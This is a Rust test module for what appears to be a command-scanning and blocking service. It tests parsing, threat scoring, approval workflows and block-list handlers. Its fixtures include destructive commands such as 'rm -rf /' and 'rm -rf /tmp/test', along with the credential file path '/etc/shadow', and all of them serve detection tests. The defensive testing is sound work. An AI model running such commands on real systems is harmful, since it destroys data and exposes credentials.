    fn parse_command_with_flags() {
        let cmd = parse_command("rm -rf /tmp/test");
        assert_eq!(cmd.binary, "rm");
        assert_eq!(cmd.args, vec!["-rf", "/tmp/test"]);
    }

    #[test]
    fn parse_command_trailing_spaces() {
        let cmd = parse_command("ls   ");
        assert_eq!(cmd.binary, "ls");
        assert!(cmd.args.is_empty());
    }

    #[test]
    fn parse_command_leading_spaces() {
        let cmd = parse_command("   ls -la");
        assert_eq!(cmd.binary, "ls");
        assert_eq!(cmd.args, vec!["-la"]);
    }

    // ── threat_level_to_score ──

    #[test]
    fn score_critical() {
        assert_eq!(threat_level_to_score(&flowlink_shield::ThreatLevel::Critical), 100);
    }

    #[test]
    fn score_high() {
        assert_eq!(threat_level_to_score(&flowlink_shield::ThreatLevel::High), 75);
    }

    #[test]
    fn score_medium() {
        assert_eq!(threat_level_to_score(&flowlink_shield::ThreatLevel::Medium), 50);
    }

    #[test]
    fn score_low() {
        assert_eq!(threat_level_to_score(&flowlink_shield::ThreatLevel::Low), 25);
    }

    // ── chrono_now ──

    #[test]
    fn chrono_now_returns_non_empty() {
        let now = chrono_now();
        assert!(!now.is_empty());
        let parsed: u64 = now.parse().expect("chrono_now should return valid timestamp");
        assert!(parsed > 1_700_000_000);
    }

    // ── BlockKind enum ──

    #[test]
    fn block_kind_command_deserialize() {
        let v: BlockKind = serde_json::from_str(r#""command""#).unwrap();
        match v {
            BlockKind::command => {}
            _ => panic!("expected command variant"),
        }
    }

    #[test]
    fn block_kind_path_deserialize() {
        let v: BlockKind = serde_json::from_str(r#""path""#).unwrap();
        match v {
            BlockKind::path => {}
            _ => panic!("expected path variant"),
        }
    }

    #[test]
    fn block_kind_pid_deserialize() {
        let v: BlockKind = serde_json::from_str(r#""pid""#).unwrap();
        match v {
            BlockKind::pid => {}
            _ => panic!("expected pid variant"),
        }
    }

    // ── ApprovalStatus ──

    #[test]
    fn approval_status_roundtrip() {
        let statuses = [
            ApprovalStatus::Pending,
            ApprovalStatus::Approved,
            ApprovalStatus::Rejected,
            ApprovalStatus::Expired,
        ];
        for s in &statuses {
            let json = serde_json::to_string(s).unwrap();
            let back: ApprovalStatus = serde_json::from_str(&json).unwrap();
            assert_eq!(*s, back);
        }
    }

    #[test]
    fn approval_status_equality() {
        assert_eq!(ApprovalStatus::Pending, ApprovalStatus::Pending);
        assert_ne!(ApprovalStatus::Approved, ApprovalStatus::Rejected);
    }

    // ── ApprovalAction ──

    #[test]
    fn approval_action_roundtrip() {
        let actions = [
            ApprovalAction::BlockCommand,
            ApprovalAction::UnblockCommand,
            ApprovalAction::ProtectPath,
            ApprovalAction::UnprotectPath,
            ApprovalAction::BlockPid,
            ApprovalAction::WhitelistPid,
        ];
        for a in &actions {
            let json = serde_json::to_string(a).unwrap();
            let back: ApprovalAction = serde_json::from_str(&json).unwrap();
            let json2 = serde_json::to_string(&back).unwrap();
            assert_eq!(json, json2);
        }
    }

    // ── ApprovalRequest ──

    fn make_approval_request() -> ApprovalRequest {
        ApprovalRequest {
            id: "apr_001".to_string(),
            action: ApprovalAction::BlockCommand,
            value: "rm".to_string(),
            reason: "dangerous command".to_string(),
            requested_by: "agent-01".to_string(),
            requested_at: "2026-01-01T00:00:00Z".to_string(),
            status: ApprovalStatus::Pending,
        }
    }

    #[test]
    fn approval_request_roundtrip() {
        let req = make_approval_request();
        let json = serde_json::to_string(&req).unwrap();
        let back: ApprovalRequest = serde_json::from_str(&json).unwrap();
        assert_eq!(back.id, req.id);
        assert_eq!(back.value, "rm");
        assert_eq!(back.status, ApprovalStatus::Pending);
    }

    #[test]
    fn approval_request_clone() {
        let req = make_approval_request();
        let cloned = req.clone();
        assert_eq!(cloned.id, req.id);
        assert!(matches!(cloned.action, ApprovalAction::BlockCommand));
    }

    #[test]
    fn approval_request_debug() {
        let req = make_approval_request();
        let dbg = format!("{:?}", req);
        assert!(dbg.contains("apr_001"));
    }

    // ── BlockedItem ──

    fn make_blocked_item() -> BlockedItem {
        BlockedItem {
            value: "chmod".to_string(),
            reason: "test".to_string(),
            blocked_at: "12345".to_string(),
        }
    }

    #[test]
    fn blocked_item_roundtrip() {
        let item = make_blocked_item();
        let json = serde_json::to_string(&item).unwrap();
        let back: BlockedItem = serde_json::from_str(&json).unwrap();
        assert_eq!(back.value, "chmod");
        assert_eq!(back.reason, "test");
    }

    #[test]
    fn blocked_item_clone() {
        let item = make_blocked_item();
        let cloned = item.clone();
        assert_eq!(cloned.value, item.value);
    }

    // ── Request types ──

    #[test]
    fn scan_request_deserialize() {
        let json = r#"{"command":"ls -la"}"#;
        let req: ScanRequest = serde_json::from_str(json).unwrap();
        assert_eq!(req.command, "ls -la");
        assert!(req.context.is_none());
    }

    #[test]
    fn scan_request_with_context() {
        let json = r#"{"command":"curl x.com","context":"user request"}"#;
        let req: ScanRequest = serde_json::from_str(json).unwrap();
        assert_eq!(req.context.as_deref(), Some("user request"));
    }

    #[test]
    fn block_request_deserialize() {
        let json = r#"{"kind":"command","value":"rm","reason":"danger"}"#;
        let req: BlockRequest = serde_json::from_str(json).unwrap();
        assert_eq!(req.value, "rm");
        assert_eq!(req.reason.as_deref(), Some("danger"));
    }

    #[test]
    fn block_request_default_reason() {
        let json = r#"{"kind":"path","value":"/etc"}"#;
        let req: BlockRequest = serde_json::from_str(json).unwrap();
        assert!(req.reason.is_none());
    }

    #[test]
    fn script_scan_request_deserialize() {
        let val = serde_json::json!({"script": "#!/bin/bash", "language": "bash"});
        let req: ScriptScanRequest = serde_json::from_value(val).unwrap();
        assert_eq!(req.script, "#!/bin/bash");
        assert_eq!(req.language.as_deref(), Some("bash"));
    }

    #[test]
    fn whitelist_request_deserialize() {
        let json = r#"{"pid":1234,"reason":"system"}"#;
        let req: WhitelistRequest = serde_json::from_str(json).unwrap();
        assert_eq!(req.pid, 1234);
        assert_eq!(req.reason.as_deref(), Some("system"));
    }

    #[test]
    fn unblock_request_deserialize() {
        let json = r#"{"kind":"command","value":"rm"}"#;
        let req: UnblockRequest = serde_json::from_str(json).unwrap();
        assert_eq!(req.value, "rm");
    }

    // ── KernelBlocker stub (macOS) ──

    #[test]
    fn kernel_blocker_try_load_none_on_macos() {
        let result = KernelBlocker::try_load(&SentinelConfig::default());
        assert!(result.is_none());
    }

    #[test]
    fn kernel_blocker_block_cmd_stub() {
        let blocker = KernelBlocker;
        assert!(blocker.block_cmd("rm").is_ok());
    }

    #[test]
    fn kernel_blocker_unblock_cmd_stub() {
        let blocker = KernelBlocker;
        assert!(blocker.unblock_cmd("rm").is_ok());
    }

    #[test]
    fn kernel_blocker_protect_path_stub() {
        let blocker = KernelBlocker;
        assert!(blocker.protect_path("/etc").is_ok());
    }

    #[test]
    fn kernel_blocker_unprotect_path_stub() {
        let blocker = KernelBlocker;
        assert!(blocker.unprotect_path("/etc").is_ok());
    }

    // ── AppState construction ──

    fn make_state() -> Arc<AppState> {
        Arc::new(AppState {
            engine: AnalysisEngine { enable_ast: false, enable_interpreter: false },
            config: Mutex::new(SentinelConfig::default()),
            blocked_commands: Mutex::new(Vec::new()),
            protected_paths: Mutex::new(Vec::new()),
            blocked_pids: Mutex::new(Vec::new()),
            whitelisted_pids: Mutex::new(Vec::new()),
            approvals: Mutex::new(Vec::new()),
            kernel: None,
        })
    }

    #[tokio::test]
    async fn app_state_default_empty() {
        let state = make_state();
        assert!(state.blocked_commands.lock().await.is_empty());
        assert!(state.protected_paths.lock().await.is_empty());
        assert!(state.blocked_pids.lock().await.is_empty());
        assert!(state.whitelisted_pids.lock().await.is_empty());
        assert!(state.approvals.lock().await.is_empty());
    }

    // ── Handlers (integration-style, no network) ──

    // Note: block_item, unblock_item, create_approval_request, approve_request,
    // reject_request return impl IntoResponse — cannot access .0 directly.
    // Test state side-effects instead.

    #[tokio::test]
    async fn health_returns_ok() {
        assert_eq!(health().await, "ok");
    }

    #[tokio::test]
    async fn get_policy_returns_json() {
        let state = make_state();
        let resp = get_policy(State(state)).await;
        assert_eq!(resp.0["status"], "active");
    }

    #[tokio::test]
    async fn handler_reload_policy() {
        let state = make_state();
        let resp = reload_policy(State(state)).await;
        assert_eq!(resp.0["status"], "reloaded");
    }

    #[tokio::test]
    async fn block_command_state_mutated() {
        let state = make_state();
        let req = BlockRequest { kind: BlockKind::command, value: "danger".into(), reason: Some("test".into()) };
        block_item(State(state.clone()), Json(req)).await;
        let blocked = state.blocked_commands.lock().await;
        assert_eq!(blocked.len(), 1);
        assert_eq!(blocked[0].value, "danger");
    }

    #[tokio::test]
    async fn block_path_state_mutated() {
        let state = make_state();
        let req = BlockRequest { kind: BlockKind::path, value: "/etc/shadow".into(), reason: None };
        block_item(State(state.clone()), Json(req)).await;
        let paths = state.protected_paths.lock().await;
        assert_eq!(paths.len(), 1);
    }

    #[tokio::test]
    async fn block_pid_state_mutated() {
        let state = make_state();
        let req = BlockRequest { kind: BlockKind::pid, value: "1234".into(), reason: None };
        block_item(State(state.clone()), Json(req)).await;
        let pids = state.blocked_pids.lock().await;
        assert_eq!(pids.len(), 1);
    }

    #[tokio::test]
    async fn unblock_removes_item() {
        let state = make_state();
        state.blocked_commands.lock().await.push(make_blocked_item());
        let req = UnblockRequest { kind: BlockKind::command, value: "chmod".into() };
        unblock_item(State(state.clone()), Json(req)).await;
        assert!(state.blocked_commands.lock().await.is_empty());
    }

    #[tokio::test]
    async fn whitelist_pid_added() {
        let state = make_state();
        let req = WhitelistRequest { pid: 1234, reason: None };
        whitelist_pid(State(state.clone()), Json(req)).await;
        let wl = state.whitelisted_pids.lock().await;
        assert_eq!(*wl, vec![1234]);
    }

    #[tokio::test]
    async fn scan_empty_command_safe() {
        let state = make_state();
        let req = ScanRequest { command: "".into(), context: None };
        let resp = scan_command(State(state), Json(req)).await;
        assert_eq!(resp.0["risk_level"], "safe");
    }

    #[tokio::test]
    async fn scan_safe_command() {
        let state = make_state();
        let req = ScanRequest { command: "ls -la".into(), context: None };
        let resp = scan_command(State(state), Json(req)).await;
        assert_eq!(resp.0["safe"], true);
    }

    #[tokio::test]
    async fn scan_script_empty() {
        let state = make_state();
        let req = ScriptScanRequest { script: "".into(), language: None };
        let resp = scan_script(State(state), Json(req)).await;
        assert_eq!(resp.0["overall_risk_level"], "safe");
        assert_eq!(resp.0["max_score"], 0);
    }

    #[tokio::test]
    async fn scan_script_with_dangerous_line() {
        let state = make_state();
        let req = ScriptScanRequest {
            script: "#!/bin/bash\nrm -rf /".into(),
            language: Some("bash".into()),
        };
        let resp = scan_script(State(state), Json(req)).await;
        let score = resp.0["max_score"].as_u64().unwrap_or(0);
        assert!(score > 0, "rm -rf / should score above 0");
    }

    #[tokio::test]
    async fn approval_create_adds_to_state() {
        let state = make_state();
        let req = make_approval_request();
        create_approval_request(State(state.clone()), Json(req)).await;
        let approvals = state.approvals.lock().await;
        assert_eq!(approvals.len(), 1);
        assert_eq!(approvals[0].id, "apr_001");
    }

    #[tokio::test]
    async fn approval_approve_adds_blocked_command() {
        let state = make_state();
        let req = make_approval_request();
        create_approval_request(State(state.clone()), Json(req)).await;
        approve_request(State(state.clone()), axum::extract::Path("apr_001".into())).await;
        let blocked = state.blocked_commands.lock().await;
        assert_eq!(blocked.len(), 1);
        assert_eq!(blocked[0].value, "rm");
    }

    #[tokio::test]
    async fn approval_reject_does_not_block() {
        let state = make_state();
        let req = make_approval_request();
        create_approval_request(State(state.clone()), Json(req)).await;
        reject_request(State(state.clone()), axum::extract::Path("apr_001".into())).await;
        assert!(state.blocked_commands.lock().await.is_empty());
    }

    // ── build_router ──

    #[test]
    fn build_router_creates_routes() {
        let state = make_state();
        let _router = build_router(state);
    }
}
